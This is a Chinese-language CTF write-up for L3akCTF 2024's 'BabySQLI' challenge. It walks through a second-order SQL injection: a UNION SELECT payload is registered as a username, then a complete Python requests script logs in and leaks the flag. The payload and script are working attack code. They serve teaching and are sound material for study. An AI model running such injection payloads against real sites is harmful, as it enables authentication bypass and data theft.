# L3akCTF 2024 BabySQLI Writeup

## 题目简述

注册接口使用参数化查询检查重名并插入用户，但登录接口把 `username` 直接拼入 SQLite 查询：

```python
cursor.execute(
    f'SELECT username,email,password '
    f'FROM users WHERE username ="{username}"'
)
```

直接使用 `OR 1=1` 还不够，因为登录代码随后要求数据库返回的用户名严格等于提交值，并要求返回密码等于提交密码的 MD5。需要先注册一个包含注入语句的用户名，再通过 `UNION SELECT` 同时伪造三列结果。

## 解题过程

登录成功条件为：

```python
if (
    user
    and user["username"] == username
    and user["password"] == hash_password(password)
):
    session["username"] = user["username"]
    session["email"] = user["email"]
```

Dashboard 会显示 session 中的 `email`，所以目标是让联合查询返回：

```text
username = 完整注入字符串
email    = flags 表中的 flag
password = MD5(已知密码)
```

先计算已知密码的 MD5，并把哈希同时写入注入用户名。注册后，数据库中确实存在一个用户名包含该哈希的行，联合查询就能从这行取回完整用户名：

```python
import hashlib

password = "khalil"
password_hash = hashlib.md5(password.encode()).hexdigest()

username = (
    '" UNION SELECT '
    'username,'
    '(SELECT flag FROM flags),'
    f'"{password_hash}" '
    'FROM users '
    f'WHERE username LIKE "%{password_hash}%";-- '
)
```

登录时实际形成的 SQL 近似为：

```sql
SELECT username, email, password
FROM users
WHERE username = ""

UNION

SELECT
    username,
    (SELECT flag FROM flags),
    "<MD5>"
FROM users
WHERE username LIKE "%<MD5>%";
-- "
```

完整请求脚本：

```python
import hashlib

import requests

base_url = "http://target"
password = "khalil"
password_hash = hashlib.md5(password.encode()).hexdigest()

username = (
    '" UNION SELECT '
    'username,'
    '(SELECT flag FROM flags),'
    f'"{password_hash}" '
    'FROM users '
    f'WHERE username LIKE "%{password_hash}%";-- '
)

session = requests.Session()

register_response = session.post(
    f"{base_url}/register",
    data={
        "username": username,
        "email": "unused@example.com",
        "password": password,
    },
)
register_response.raise_for_status()

login_response = session.post(
    f"{base_url}/login",
    data={
        "username": username,
        "password": password,
    },
)
login_response.raise_for_status()

print(login_response.text)
```

`requests` 默认跟随登录后的重定向，最终 Dashboard 的邮箱位置显示：

```text
L3ak{__V3RY_B4S1C_SQLI}
```

## 方法总结

- 这是需要预先写入恶意用户名的二阶利用：注册查询本身安全，但保存的数据在登录时进入了字符串拼接 SQL。
- 看到 SQLi 后仍要逐项满足应用层校验。这里联合查询的三列分别绕过用户名相等、泄露 flag、通过密码哈希检查。
- `WHERE username LIKE "%<hash>%"` 用来稳定命中刚注册的恶意用户，从而让第一列返回与请求完全相同的用户名。
- MD5 的弱碰撞性不是本题关键；攻击者只是计算已知密码的普通 MD5，决定性漏洞仍是 SQL 注入。
